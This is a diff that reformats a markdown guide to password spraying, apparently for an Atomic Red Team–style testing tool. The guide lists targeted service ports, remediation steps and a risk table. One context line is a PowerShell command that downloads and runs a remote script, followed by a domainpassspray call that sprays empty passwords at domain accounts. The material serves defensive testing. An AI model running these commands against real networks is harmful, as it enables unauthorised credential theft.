@@ -68,22 +68,22 @@ severity_boost:
 
 ## High-Level Description
 
-Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. 
+Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords.
 
 Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:
 
-* SSH (22/TCP)
-* Telnet (23/TCP)
-* FTP (21/TCP)
-* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
-* LDAP (389/TCP)
-* Kerberos (88/TCP)
-* RDP / Terminal Services (3389/TCP)
-* HTTP/HTTP Management Services (80/TCP & 443/TCP)
-* MSSQL (1433/TCP)
-* Oracle (1521/TCP)
-* MySQL (3306/TCP)
-* VNC (5900/TCP)
+- SSH (22/TCP)
+- Telnet (23/TCP)
+- FTP (21/TCP)
+- NetBIOS / SMB / Samba (139/TCP & 445/TCP)
+- LDAP (389/TCP)
+- Kerberos (88/TCP)
+- RDP / Terminal Services (3389/TCP)
+- HTTP/HTTP Management Services (80/TCP & 443/TCP)
+- MSSQL (1433/TCP)
+- Oracle (1521/TCP)
+- MySQL (3306/TCP)
+- VNC (5900/TCP)
 
 In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.
 
@@ -124,6 +124,7 @@ See the "Windows FOR Loop Password Spraying Made Easy" blog by @OrOneEqualsOne f
 ```
 
 **Dependencies:**
+
 - List of domain users to password spray must exits at %temp%\users.txt
 
 ### Atomic Test 2: Password Spray (DomainPasswordSpray)
@@ -187,7 +188,6 @@ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 domainpassspray -consoleoutput -noninteractive -emptypasswords
 ```
 
-
 ### Manual Testing
 
 If Atomic Red Team tests are not applicable, manually verify the technique by:
@@ -201,32 +201,32 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1032 Multi-factor Authentication
+
 Use multi-factor authentication. Where possible, also enable multi-factor authentication on externally facing services.
 
 ### M1027 Password Policies
+
 Refer to NIST guidelines when creating password policies.
 
 ### M1036 Account Use Policies
-Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Too strict a policy may create a denial of service condition and render environments un-usable, with all accounts used in the brute force being locked-out. Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges. Consider blocking risky authentication requests, such as those originating from anonymizing services/proxies.
 
+Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Too strict a policy may create a denial of service condition and render environments un-usable, with all accounts used in the brute force being locked-out. Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges. Consider blocking risky authentication requests, such as those originating from anonymizing services/proxies.
 
 ## Detection
 
 ### Distributed Password Spraying via Authentication Failures Across Multiple Accounts
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| Password Spraying technique applicable | High | Credential Access |
+| Finding                                | Severity | Impact            |
+| -------------------------------------- | -------- | ----------------- |
+| Password Spraying technique applicable | High     | Credential Access |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                                |
+| ------- | ------------------------------------ |
 | CWE-522 | Insufficiently Protected Credentials |
-
 
 ## References
 
